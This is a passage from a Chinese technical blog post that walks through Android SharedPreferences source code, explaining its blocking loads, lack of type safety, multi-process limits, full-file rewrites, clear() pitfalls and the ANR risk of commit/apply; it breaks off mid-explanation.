mFile &#x3D; file;</span><br><span class="line">        mBackupFile &#x3D; makeBackupFile(file);</span><br><span class="line">        mMode &#x3D; mode;</span><br><span class="line">        mLoaded &#x3D; false;</span><br><span class="line">        mMap &#x3D; null;</span><br><span class="line">        mThrowable &#x3D; null;</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @UnsupportedAppUsage</span><br><span class="line">    private void startLoadFromDisk() &#123;</span><br><span class="line">        synchronized (mLock) &#123;</span><br><span class="line">            mLoaded &#x3D; false;</span><br><span class="line">        &#125;</span><br><span class="line">        new Thread(&quot;SharedPreferencesImpl-load&quot;) &#123;</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                &#x2F;&#x2F;加载磁盘文件</span><br><span class="line">                loadFromDisk();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而如果我们在初始化 SharedPreferencesImpl 后紧接着就去 getValue 的话，势必也需要确保子线程已经加载完成后才去进行取值操作，所以 SharedPreferencesImpl 就通过在每个 getValue 方法中调用 <code>awaitLoadedLocked()</code>方法来判断是否需要阻塞外部线程，确保取值操作一定会在子线程执行完毕后才执行。<code>loadFromDisk()</code>方法会在任务执行完毕后调用 <code>mLock.notifyAll()</code>唤醒所有被阻塞的线程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">@Nullable</span><br><span class="line">public String getString(String key, @Nullable String defValue) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        &#x2F;&#x2F;判断是否需要让外部线程等待</span><br><span class="line">        awaitLoadedLocked();</span><br><span class="line">        String v &#x3D; (String)mMap.get(key);</span><br><span class="line">        return v !&#x3D; null ? v : defValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GuardedBy(&quot;mLock&quot;)</span><br><span class="line">private void awaitLoadedLocked() &#123;</span><br><span class="line">    if (!mLoaded) &#123;</span><br><span class="line">        BlockGuard.getThreadPolicy().onReadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line">    while (!mLoaded) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;还未加载线程，让外部线程暂停等待</span><br><span class="line">            mLock.wait();</span><br><span class="line">        &#125; catch (InterruptedException unused) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (mThrowable !&#x3D; null) &#123;</span><br><span class="line">        throw new IllegalStateException(mThrowable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void loadFromDisk() &#123;</span><br><span class="line">    ···</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mLoaded &#x3D; true;</span><br><span class="line">        mThrowable &#x3D; thrown;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (thrown &#x3D;&#x3D; null) &#123;</span><br><span class="line">                if (map !&#x3D; null) &#123;</span><br><span class="line">                    mMap &#x3D; map;</span><br><span class="line">                    mStatTimestamp &#x3D; stat.st_mtim;</span><br><span class="line">                    mStatSize &#x3D; stat.st_size;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    mMap &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            mThrowable &#x3D; t;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            &#x2F;&#x2F;唤醒所有被阻塞的线程</span><br><span class="line">            mLock.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说，如果 SP 存储的数据量很大的话，那么就有可能导致外部的调用者线程被阻塞，严重时甚至可能导致 ANR。当然，这种可能性也只是发生在加载磁盘文件完成之前，当加载完成后 <code>awaitLoadedLocked()</code>方法自然不会阻塞线程</p><blockquote><p>GetValue 不保证数据类型安全</p></blockquote><p>以下代码在编译阶段是完全正常的，但在运行时就会抛出异常：<code>java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</code>。很明显，这是由于同个 key 先后对应了不同数据类型导致的，SharedPreferences 没有办法对这种操作做出限制，完全需要依赖于开发者自己的代码规范来进行限制</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> sharedPreferences: SharedPreferences = getSharedPreferences(<span class="string">&quot;UserInfo&quot;</span>, Context.MODE_PRIVATE)</span><br><span class="line"><span class="keyword">val</span> key = <span class="string">&quot;userName&quot;</span></span><br><span class="line"><span class="keyword">val</span> edit = sharedPreferences.edit()</span><br><span class="line">edit.putInt(key, <span class="number">11</span>)</span><br><span class="line">edit.apply()</span><br><span class="line"><span class="keyword">val</span> name = sharedPreferences.getString(key, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>不支持多进程数据共享</p></blockquote><p>在获取 SP 实例的时候需要传入一个 int 类型的 mode 标记位参数，存在一个和多进程相关的标记位 MODE_MULTI_PROCESS，该标记位能起到一定程度的多进程数据同步的保障，但作用不大，且并不保证多进程并发安全性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val sharedPreferences: SharedPreferences &#x3D; getSharedPreferences(&quot;UserInfo&quot;, Context.MODE_MULTI_PROCESS)</span><br></pre></td></tr></table></figure><p>上文有讲到，SharedPreferencesImpl 在被加载后就会一直保留在内存中，之后每次获取都是直接使用缓存数据，通常情况下也不会再次去加载磁盘文件。而 MODE_MULTI_PROCESS 起到的作用就是每当再一次去获取 SP 实例时，会判断当前磁盘文件相对最后一次内存修改是否被改动过了，如果是的话就主动去重新加载磁盘文件，从而可以做到在多进程环境下一定的数据同步<br>但是，这种同步本身作用不大，因为即使此时重新加载磁盘文件了，后续修改 SP 值时不同进程中的内存数据也不会实时同步，且多进程同时修改 SP 值也存在数据丢失和数据覆盖的可能。所以说，SP 并不支持多进程数据共享，MODE_MULTI_PROCESS 也已经被废弃了，其注释也推荐使用 ContentProvider 来实现跨进程通信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class ContextImpl extends Context &#123;</span><br><span class="line">    </span><br><span class="line">    @Override</span><br><span class="line">    public SharedPreferences getSharedPreferences(File file, int mode) &#123;</span><br><span class="line">        SharedPreferencesImpl sp;</span><br><span class="line">        synchronized (ContextImpl.class) &#123;</span><br><span class="line">            ···</span><br><span class="line">        &#125;</span><br><span class="line">        if ((mode &amp; Context.MODE_MULTI_PROCESS) !&#x3D; 0 ||</span><br><span class="line">            getApplicationInfo().targetSdkVersion &lt; android.os.Build.VERSION_CODES.HONEYCOMB) &#123;</span><br><span class="line">            &#x2F;&#x2F;重新去加载磁盘文件</span><br><span class="line">            sp.startReloadIfChangedUnexpectedly();</span><br><span class="line">        &#125;</span><br><span class="line">        return sp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不支持增量更新</p></blockquote><p>我们知道，SP 提交数据的方法有两个：<code>commit()</code> 和 <code>apply()</code>，分别对应着同步修改和异步修改，而这两种方式对应的都是全量更新，SP 以文件为最小单位进行修改，即使我们只修改了一个键值对，这两个方法也会将所有键值对数据重新写入到磁盘文件中，即 SP 只支持全量更新<br>我们平时获取到的 Editor 对象，对应的都是 SharedPreferencesImpl 的内部类 EditorImpl。EditorImpl 的每个 putValue 方法都会将传进来的 key-value 保存在 <code>mModified</code> 中，暂时还没有涉及任何文件改动。比较特殊的是 <code>remove</code> 和 <code>clear</code> 两个方法，<code>remove</code> 方法会将 this 作为键值对的 value，后续就通过对比 value 的相等性来知道是要移除键值对还是修改键值对，<code>clear</code> 方法则只是将 mClear 标记位置为 true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public final class EditorImpl implements Editor &#123;</span><br><span class="line">    </span><br><span class="line">        private final Object mEditorLock &#x3D; new Object();</span><br><span class="line"></span><br><span class="line">        @GuardedBy(&quot;mEditorLock&quot;)</span><br><span class="line">        private final Map&lt;String, Object&gt; mModified &#x3D; new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        @GuardedBy(&quot;mEditorLock&quot;)</span><br><span class="line">        private boolean mClear &#x3D; false;</span><br><span class="line">    </span><br><span class="line">    @Override</span><br><span class="line">        public Editor putString(String key, @Nullable String value) &#123;</span><br><span class="line">            synchronized (mEditorLock) &#123;</span><br><span class="line">                mModified.put(key, value);</span><br><span class="line">                return this;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        @Override</span><br><span class="line">        public Editor remove(String key) &#123;</span><br><span class="line">            synchronized (mEditorLock) &#123;</span><br><span class="line">                &#x2F;&#x2F;存入当前的 EditorImpl 对象</span><br><span class="line">                mModified.put(key, this);</span><br><span class="line">                return this;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public Editor clear() &#123;</span><br><span class="line">            synchronized (mEditorLock) &#123;</span><br><span class="line">                mClear &#x3D; true;</span><br><span class="line">                return this;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>commit()</code> 和<code>apply()</code>两个方法都会通过调用 <code>commitToMemory()</code>方法拿到修改后的全量数据<code>commitToMemory()</code>采用了 diff 算法，SP 包含的所有键值对数据都存储在 mapToWriteToDisk 中，Editor 改动到的所有键值对数据都存储在 mModified 中。如果  mClear 为 true，则会先清空 mapToWriteToDisk，然后再遍历 mModified，将 mModified 中的所有改动都同步给 mapToWriteToDisk。最终 mapToWriteToDisk 就保存了要重新写入到磁盘文件中的全量数据，SP 会根据 mapToWriteToDisk 完全覆盖掉旧的 xml 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Returns true if any changes were made</span><br><span class="line">private MemoryCommitResult commitToMemory() &#123;</span><br><span class="line">    long memoryStateGeneration;</span><br><span class="line">    boolean keysCleared &#x3D; false;</span><br><span class="line">    List&lt;String&gt; keysModified &#x3D; null;</span><br><span class="line">    Set&lt;OnSharedPreferenceChangeListener&gt; listeners &#x3D; null;</span><br><span class="line">    Map&lt;String, Object&gt; mapToWriteToDisk;</span><br><span class="line">    synchronized (SharedPreferencesImpl.this.mLock) &#123;</span><br><span class="line">        &#x2F;&#x2F; We optimistically don&#39;t make a deep copy until</span><br><span class="line">        &#x2F;&#x2F; a memory commit comes in when we&#39;re already</span><br><span class="line">        &#x2F;&#x2F; writing to disk.</span><br><span class="line">        if (mDiskWritesInFlight &gt; 0) &#123;</span><br><span class="line">            &#x2F;&#x2F; We can&#39;t modify our mMap as a currently</span><br><span class="line">            &#x2F;&#x2F; in-flight write owns it.  Clone it before</span><br><span class="line">            &#x2F;&#x2F; modifying it.</span><br><span class="line">            &#x2F;&#x2F; noinspection unchecked</span><br><span class="line">            mMap &#x3D; new HashMap&lt;String, Object&gt;(mMap);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;拿到内存中的全量数据</span><br><span class="line">        mapToWriteToDisk &#x3D; mMap;</span><br><span class="line">        mDiskWritesInFlight++;</span><br><span class="line">        boolean hasListeners &#x3D; mListeners.size() &gt; 0;</span><br><span class="line">        if (hasListeners) &#123;</span><br><span class="line">            keysModified &#x3D; new ArrayList&lt;String&gt;();</span><br><span class="line">            listeners &#x3D; new HashSet&lt;OnSharedPreferenceChangeListener&gt;(mListeners.keySet());</span><br><span class="line">        &#125;</span><br><span class="line">        synchronized (mEditorLock) &#123;</span><br><span class="line">            &#x2F;&#x2F;用于标记最终是否改动到了 mapToWriteToDisk</span><br><span class="line">            boolean changesMade &#x3D; false;</span><br><span class="line">            if (mClear) &#123;</span><br><span class="line">                if (!mapToWriteToDisk.isEmpty()) &#123;</span><br><span class="line">                    changesMade &#x3D; true;</span><br><span class="line">                    &#x2F;&#x2F;清空所有在内存中的数据</span><br><span class="line">                    mapToWriteToDisk.clear();</span><br><span class="line">                &#125;</span><br><span class="line">                keysCleared &#x3D; true;</span><br><span class="line">                &#x2F;&#x2F;恢复状态，避免二次修改时状态错位</span><br><span class="line">                mClear &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (Map.Entry&lt;String, Object&gt; e : mModified.entrySet()) &#123;</span><br><span class="line">                String k &#x3D; e.getKey();</span><br><span class="line">                Object v &#x3D; e.getValue();</span><br><span class="line">                &#x2F;&#x2F; &quot;this&quot; is the magic value for a removal mutation. In addition,</span><br><span class="line">                &#x2F;&#x2F; setting a value to &quot;null&quot; for a given key is specified to be</span><br><span class="line">                &#x2F;&#x2F; equivalent to calling remove on that key.</span><br><span class="line">                if (v &#x3D;&#x3D; this || v &#x3D;&#x3D; null) &#123; &#x2F;&#x2F;意味着要移除该键值对</span><br><span class="line">                    if (!mapToWriteToDisk.containsKey(k)) &#123;</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    mapToWriteToDisk.remove(k);</span><br><span class="line">                &#125; else &#123; &#x2F;&#x2F;对应修改键值对值的情况</span><br><span class="line">                    if (mapToWriteToDisk.containsKey(k)) &#123;</span><br><span class="line">                        Object existingValue &#x3D; mapToWriteToDisk.get(k);</span><br><span class="line">                        if (existingValue !&#x3D; null &amp;&amp; existingValue.equals(v)) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;&#x2F;只有在的确是修改了或新插入键值对的情况才需要保存值</span><br><span class="line">                    mapToWriteToDisk.put(k, v);</span><br><span class="line">                &#125;</span><br><span class="line">                changesMade &#x3D; true;</span><br><span class="line">                if (hasListeners) &#123;</span><br><span class="line">                    keysModified.add(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;恢复状态，避免二次修改时状态错位</span><br><span class="line">            mModified.clear();</span><br><span class="line">            if (changesMade) &#123;</span><br><span class="line">                mCurrentMemoryStateGeneration++;</span><br><span class="line">            &#125;</span><br><span class="line">            memoryStateGeneration &#x3D; mCurrentMemoryStateGeneration;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return new MemoryCommitResult(memoryStateGeneration, keysCleared, keysModified,</span><br><span class="line">            listeners, mapToWriteToDisk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Clear 的反直觉用法</p></blockquote><p>看以下例子。按照语义分析的话，最终 SP 中应该是只剩下 blog 一个键值对才符合直觉，而实际上最终两个键值对都会被保留，且只有这两个键值对被保留下来</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> sharedPreferences: SharedPreferences = getSharedPreferences(<span class="string">&quot;UserInfo&quot;</span>, Context.MODE_PRIVATE)</span><br><span class="line"><span class="keyword">val</span> edit = sharedPreferences.edit()</span><br><span class="line">edit.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;业志陈&quot;</span>).clear().putString(<span class="string">&quot;blog&quot;</span>, <span class="string">&quot;https://juejin.cn/user/923245496518439&quot;</span>)</span><br><span class="line">edit.apply()</span><br></pre></td></tr></table></figure><p>造成该问题的原因还需要看<code>commitToMemory()</code>方法。<code>clear()</code>会将 mClear 置为 true，所以在执行到第一步的时候就会将内存中的所有键值对数据 mapToWriteToDisk 清空。当执行到第二步的时候，mModified 中的所有数据就都会同步到 mapToWriteToDisk 中，从而导致最终 name 和 blog 两个键值对都会被保留下来，其它键值对都被移除了<br>所以说，<code>Editor.clear()</code> 之前不应该连贯调用 putValue 语句，这会造成理解和实际效果之间的偏差</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Returns true if any changes were made</span><br><span class="line">private MemoryCommitResult commitToMemory() &#123;</span><br><span class="line">    long memoryStateGeneration;</span><br><span class="line">    boolean keysCleared &#x3D; false;</span><br><span class="line">    List&lt;String&gt; keysModified &#x3D; null;</span><br><span class="line">    Set&lt;OnSharedPreferenceChangeListener&gt; listeners &#x3D; null;</span><br><span class="line">    Map&lt;String, Object&gt; mapToWriteToDisk;</span><br><span class="line">    synchronized (SharedPreferencesImpl.this.mLock) &#123;</span><br><span class="line">        &#x2F;&#x2F; We optimistically don&#39;t make a deep copy until</span><br><span class="line">        &#x2F;&#x2F; a memory commit comes in when we&#39;re already</span><br><span class="line">        &#x2F;&#x2F; writing to disk.</span><br><span class="line">        if (mDiskWritesInFlight &gt; 0) &#123;</span><br><span class="line">            &#x2F;&#x2F; We can&#39;t modify our mMap as a currently</span><br><span class="line">            &#x2F;&#x2F; in-flight write owns it.  Clone it before</span><br><span class="line">            &#x2F;&#x2F; modifying it.</span><br><span class="line">            &#x2F;&#x2F; noinspection unchecked</span><br><span class="line">            mMap &#x3D; new HashMap&lt;String, Object&gt;(mMap);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;拿到内存中的全量数据</span><br><span class="line">        mapToWriteToDisk &#x3D; mMap;</span><br><span class="line">        mDiskWritesInFlight++;</span><br><span class="line">        boolean hasListeners &#x3D; mListeners.size() &gt; 0;</span><br><span class="line">        if (hasListeners) &#123;</span><br><span class="line">            keysModified &#x3D; new ArrayList&lt;String&gt;();</span><br><span class="line">            listeners &#x3D; new HashSet&lt;OnSharedPreferenceChangeListener&gt;(mListeners.keySet());</span><br><span class="line">        &#125;</span><br><span class="line">        synchronized (mEditorLock) &#123;</span><br><span class="line">            boolean changesMade &#x3D; false;</span><br><span class="line">            if (mClear) &#123; &#x2F;&#x2F;第一步</span><br><span class="line">                if (!mapToWriteToDisk.isEmpty()) &#123;</span><br><span class="line">                    changesMade &#x3D; true;</span><br><span class="line">                    &#x2F;&#x2F;清空所有在内存中的数据</span><br><span class="line">                    mapToWriteToDisk.clear();</span><br><span class="line">                &#125;</span><br><span class="line">                keysCleared &#x3D; true;</span><br><span class="line">                &#x2F;&#x2F;恢复状态，避免二次修改时状态错位</span><br><span class="line">                mClear &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (Map.Entry&lt;String, Object&gt; e : mModified.entrySet()) &#123; &#x2F;&#x2F;第二步</span><br><span class="line">                String k &#x3D; e.getKey();</span><br><span class="line">                Object v &#x3D; e.getValue();</span><br><span class="line">                &#x2F;&#x2F; &quot;this&quot; is the magic value for a removal mutation. In addition,</span><br><span class="line">                &#x2F;&#x2F; setting a value to &quot;null&quot; for a given key is specified to be</span><br><span class="line">                &#x2F;&#x2F; equivalent to calling remove on that key.</span><br><span class="line">                if (v &#x3D;&#x3D; this || v &#x3D;&#x3D; null) &#123; &#x2F;&#x2F;意味着要移除该键值对</span><br><span class="line">                    if (!mapToWriteToDisk.containsKey(k)) &#123;</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    mapToWriteToDisk.remove(k);</span><br><span class="line">                &#125; else &#123; &#x2F;&#x2F;对应修改键值对值的情况</span><br><span class="line">                    if (mapToWriteToDisk.containsKey(k)) &#123;</span><br><span class="line">                        Object existingValue &#x3D; mapToWriteToDisk.get(k);</span><br><span class="line">                        if (existingValue !&#x3D; null &amp;&amp; existingValue.equals(v)) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;&#x2F;只有在的确是修改了或新插入键值对的情况才需要保存值</span><br><span class="line">                    mapToWriteToDisk.put(k, v);</span><br><span class="line">                &#125;</span><br><span class="line">                changesMade &#x3D; true;</span><br><span class="line">                if (hasListeners) &#123;</span><br><span class="line">                    keysModified.add(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;恢复状态，避免二次修改时状态错位</span><br><span class="line">            mModified.clear();</span><br><span class="line">            if (changesMade) &#123;</span><br><span class="line">                mCurrentMemoryStateGeneration++;</span><br><span class="line">            &#125;</span><br><span class="line">            memoryStateGeneration &#x3D; mCurrentMemoryStateGeneration;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return new MemoryCommitResult(memoryStateGeneration, keysCleared, keysModified,</span><br><span class="line">            listeners, mapToWriteToDisk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Commit、apply 可能导致 ANR</p></blockquote><p><code>commit()</code> 方法会通过 <code>commitToMemory()</code> 方法拿到本次修改后的全量数据，即 MemoryCommitResult，然后向 <code>enqueueDiskWrite</code> 方法提交将全量数据写入磁盘文件的任务，在写入完成前调用者线程都会由于 CountDownLatch 一直阻塞等待着，方法返回值即本次修改操作的成功状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   @Override</span><br><span class="line">   public boolean commit() &#123;</span><br><span class="line">       long startTime &#x3D; 0;</span><br><span class="line">       if (DEBUG) &#123;</span><br><span class="line">           startTime &#x3D; System.currentTimeMillis();</span><br><span class="line">       &#125;</span><br><span class="line">&#x2F;&#x2F;拿到修改后的全量数据</span><br><span class="line">       MemoryCommitResult mcr &#x3D; commitToMemory();</span><br><span class="line">&#x2F;&#x2F;提交写入磁盘文件的任务</span><br><span class="line">       SharedPreferencesImpl.this.enqueueDiskWrite(</span><br><span class="line">           mcr, null &#x2F;* sync write on this thread okay *&#x2F;);</span><br><span class="line">       try &#123;</span><br><span class="line">           &#x2F;&#x2F;阻塞等待，直到 xml 文件写入完成（不管成功与否）</span><br><span class="line">           mcr.writtenToDiskLatch.await();</span><br><span class="line">       &#125; catch (InterruptedException e) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125; finally &#123;</span><br><span class="line">           if (DEBUG) &#123;</span><br><span class="line">               Log.d(TAG, mFile.getName() + &quot;:&quot; + mcr.memoryStateGeneration</span><br><span class="line">                       + &quot; committed after &quot; + (System.currentTimeMillis() - startTime)</span><br><span class="line">                       + &quot; ms&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       notifyListeners(mcr);</span><br><span class="line">       return mcr.writeToDiskResult;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>enqueueDiskWrite</code> 方法就是包含了具体的磁盘写入逻辑的地方了，由于外部可能存在多个线程在同时执行 <code>apply()</code> 和 <code>commit()</code> 两个方法，而对应的磁盘文件只有一个，所以 <code>enqueueDiskWrite</code> 方法就必须保证写入操作的有序性，避免数据丢失或者覆盖，甚至是文件损坏<br><code>enqueueDiskWrite</code> 方法的具体逻辑：</p><ol><li>writeToDiskRunnable 使用到了内部锁 mWritingToDiskLock 来保证 writeToFile 操作的有序性，避免多线程竞争</li><li>对于 commit 操作，如果当前只有一个线程在执行提交修改的操作的话，那么直接在该线程上执行 writeToDiskRunnable，流程结束</li><li>对于其他情况（apply 操作、多线程同时 commit 或者 apply），都会将 writeToDiskRunnable 提交给 QueuedWork 执行</li><li>QueuedWork 内部使用到了 HandlerThread 来执行 